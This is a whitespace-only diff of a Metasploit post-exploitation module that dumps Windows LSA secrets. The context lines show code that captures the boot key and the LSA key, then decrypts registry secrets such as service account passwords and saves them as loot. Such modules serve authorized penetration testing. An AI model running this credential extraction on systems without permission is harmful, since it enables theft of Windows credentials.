@@ -17,7 +17,7 @@ class Metasploit3 < Msf::Post
       'Name'            => "Windows Enumerate LSA Secrets",
       'Description'     => %q{
         This module will attempt to enumerate the LSA Secrets keys within the registry. The registry value used is:
-        HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\\. Thanks goes to Maurizio Agazzini and Mubix for decrypt 
+        HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\\. Thanks goes to Maurizio Agazzini and Mubix for decrypt
         code from cachedump.
         },
       'License'         => MSF_LICENSE,
@@ -211,7 +211,7 @@ class Metasploit3 < Msf::Post
             sk_arr = meterpreter_registry_enumkeys(mid_key)
             sk_arr.each do |mkeys|
               begin
-                #CurrVal stores the currently set value of the key, in the case of 
+                #CurrVal stores the currently set value of the key, in the case of
                 #services it usually come out as plan text
                 if(mkeys == "CurrVal")
                   val_key = root_key + "\\" + keys + "\\" + mkeys
@@ -226,7 +226,7 @@ class Metasploit3 < Msf::Post
                     sec = sec[0xC..-1]
                     sec = decrypt_secret(sec, lkey).scan(/[[:print:]]/).join
                   end
-                  if(sec.length > 0) 
+                  if(sec.length > 0)
                     if(keys[0,4] == "_SC_")
                       user_key = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\"
                       keys_c = keys[4,keys.length]
@@ -241,7 +241,7 @@ class Metasploit3 < Msf::Post
                       #if the unencrypted value is not blank, print
                       print_good("Key: #{keys} \n Decrypted Value: #{sec}\n")
                       sec_str = sec_str << "Key: #{keys} \n Decrypted Value: #{sec}\n"
-                    end                 
+                    end
                   end
                 else
                   next
@@ -262,24 +262,24 @@ class Metasploit3 < Msf::Post
     rescue
       print_error("Cannot find key.")
     end
-  return sec_str 
+  return sec_str
   end
 
   # The sauce starts here
   def run
     print_status('Obtaining boot key...')
     bootkey = capture_boot_key
-    #print_status("Boot key: #{bootkey.unpack("H*")[0]}") 
+    #print_status("Boot key: #{bootkey.unpack("H*")[0]}")
 
     print_status('Obtaining Lsa key...')
     lsakey = capture_lsa_key(bootkey)
-    #print_status("Lsa Key: #{lsakey.unpack("H*")[0]}") 
+    #print_status("Lsa Key: #{lsakey.unpack("H*")[0]}")
 
     hostname = session.sys.config.sysinfo['Computer']
     print_status("Executing module against #{hostname}")
     client.railgun.netapi32()
     begin
-      secrets = hostname << get_secret(lsakey)      
+      secrets = hostname << get_secret(lsakey)
       print_status("Writing to loot...")
       path = store_loot(
         'registry.lsa.sec',
